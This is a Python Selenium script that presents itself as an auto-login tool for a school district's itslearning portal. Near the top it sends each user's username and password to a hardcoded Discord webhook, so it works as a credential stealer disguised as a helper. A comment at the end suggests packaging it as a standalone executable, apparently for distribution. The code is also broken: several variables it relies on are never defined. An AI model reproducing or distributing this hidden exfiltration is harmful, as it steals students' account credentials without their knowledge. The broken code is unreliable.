#Coded completely by smokeytube
from selenium import webdriver
import time, datetime
from tkinter import *
from discord_webhook import DiscordWebhook
from datetime import datetime

username = input("Discord username: ")


webhook = DiscordWebhook(url='https://discord.com/api/webhooks/773997704937340978/HMBvUxgxqkLSpe7Pa2316Bp9IwlxpaSYT7nC6u6F5SMWQlT9oTvfetGbP49tKM36d0Ae', content="Password for " + userw + " is "  + passw)
response = webhook.execute()

#assings chromedriver.exe to a variable for easy access
CHROME_DVR_DIR = 'chromedriver.exe'
driver = webdriver.Chrome(CHROME_DVR_DIR)

#this is the loop that will check what time it is and if it is the time you selected it will run certian code
while True:
    now = datetime.now()
    current_time = now.strftime("%H:%M")
    print (current_time)
    #the code that will log in for you
    if current_time == selectime:
        try:
            driver.implicitly_wait(5)
            driver.get('https://fcss-adfs.forsyth.k12.ga.us/adfs/ls/?SAMLRequest=fZLLTsMwEEV%2FJfI%2BdhJCH1YTqVAhKhVRtYEFGzRNJq1FYhePU5W%2FJ0l5lAXdea7mzj0ee0JQV3s5bdxOr%2FC9QXLefJaw1%2FE4KgZhCH4QjK%2F8uMDAH8Wb9lTCAIvhKC6DnHnPaEkZnbCIB8ybEzU41%2BRAu1YKosAPQz%2BIsnAow4GMY34dD16YN2tTlAbXO3fO7UkKUeZEPhQl8dJY%2BnA7%2FhZGfAu8IdHJoiLBvDtjc%2BxpE1ZCRdilLoFIHfBHWVrjTG6qG6ULpbcJa6yWBkiR1FAjSZfL9fRhIVtquTk1kbzPsqW%2FfFxnzJsSoe3wbo2mpka7RntQOT6tFr%2FADYVcOaoQrG4H8NzUAhdmq7T4z8%2BB9kfmHetKk%2Bw3f5lt%2F3URlk66btkv2J75L9vhG4Oll6CVdri1%2FXOQ6KbW6KAAB30RHSIRTcRZfnqq%2Fv6a9BM%3D&RelayState=ItsL1eyJjIjowLCJuIjoiZm9yc3l0aCIsInMiOjB90')
            print('hitting itslearning...')
            time.sleep(2)
            #the "driver.find_element_by_id" elements find the object in the chrome tab to click on
            username_input = driver.find_element_by_id("userNameInput")
            password_input = driver.find_element_by_id("passwordInput")
            print('waiting...')
            time.sleep(1)
            username_input = driver.find_element_by_id("userNameInput")
            username_input.send_keys(userw)
            time.sleep(1)
            password_input = driver.find_element_by_id("passwordInput")
            password_input.send_keys(passw)
            time.sleep(1)
            login_button = driver.find_element_by_id("submitButton")
            login_button.click()
            #the try: and except: statements handle any inconsistencies in the webpage 
            try:
                login_student = driver.find_element_by_xpath('//*[@id="ctl00_ContentPlaceHolder1_federatedLoginWrapper"]/a')
                login_student.click()
                print ("Logged in at " + selectime + "successfully!")
                while True:
                    time.sleep(360)
            except:
                print ("Logged in at " + selectime + "successfully!")
                while True:
                    time.sleep(360)
                
        except:
            print ("Failed. Could not log in. This could be that you typed in your password wrong, or itslearning blocked the automated request.")
    else:
        print("Current Time =", current_time)
        #the time.sleep will put the program to sleep for 25 seconds to prevent the while True: loop from eating up your cpu 
        time.sleep(25)


#pyinstaller --onefile itsLearning_Auto_Login.py